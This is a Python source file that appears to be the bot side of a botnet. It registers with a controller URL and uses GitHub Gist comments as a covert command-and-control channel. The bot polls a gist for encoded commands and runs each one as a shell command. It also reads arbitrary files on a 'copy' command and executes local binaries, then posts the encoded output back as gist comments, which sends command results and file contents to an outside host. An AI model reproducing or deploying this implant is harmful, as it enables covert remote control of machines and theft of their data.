import atexit
import json
import subprocess

import requests
from apscheduler.schedulers.background import BackgroundScheduler
from flask import Flask

from constants import CONTROLLER_URL, CHECKING_COMMENT_PERIOD_SECONDS, BOT_MESSAGES
from utils import get_new_gist_comment, get_decoded_message, get_encoded_message, add_gist_comment

SCHEDULER = BackgroundScheduler()
SCHEDULER.start()
BOT_PORT = 8888
LAST_COMMENT_DECODED = None

app = Flask(__name__)


@app.route("/alive", methods=["GET"])
def is_alive():
    return app.response_class(
        response=json.dumps({"alive": True}),
        status=200,
        mimetype='application/json'
    )


def check_new_comments(gist_id):
    global LAST_COMMENT_DECODED
    gist_comment = get_new_gist_comment(gist_id)

    if gist_comment is None:
        return

    decoded_comment = get_decoded_message(gist_comment)

    if LAST_COMMENT_DECODED is None or LAST_COMMENT_DECODED != decoded_comment:

        splitted = decoded_comment.split()
        output = None
        res = None

        if splitted[0] == "binary":
            output = process_command("./" + splitted[1])
            res = output
        elif splitted[0] == "copy":
            output = process_copy(splitted[1])
            res = "Copying complete"
        else:
            output = process_command(decoded_comment)
            res = output

        cmd_name = decoded_comment.split()[0]

        print("-"+decoded_comment)
        print(res)

        message = BOT_MESSAGES[cmd_name]
        encoded_message = get_encoded_message(message, output)
        add_gist_comment(gist_id, encoded_message)

        LAST_COMMENT_DECODED = output


def process_command(command) -> str:
    return subprocess.getoutput(command)


def process_copy(file) -> str:
    f = open(file, "r")
    return f.read()


def unregister_before_exit(gist_id):
    data = {
        "gist_id": gist_id
    }

    requests.delete(CONTROLLER_URL + "/unregister-bot", json=data)


# At the start he must register to controller. Then controller will create gist and the next communication will be
# via gist.
controller_response = requests.post(CONTROLLER_URL + "/register-bot", json={"url": "http://127.0.0.1:8888"})
gist = controller_response.json().get("gist_id")

if gist is None:
    print("Gist is empty - ERROR")
else:
    check_new_comments(gist)
    SCHEDULER.add_job(func=check_new_comments, args=[gist], trigger="interval",
                      seconds=CHECKING_COMMENT_PERIOD_SECONDS)
    app.run(host="0.0.0.0", port=BOT_PORT)

atexit.register(lambda: unregister_before_exit(gist))
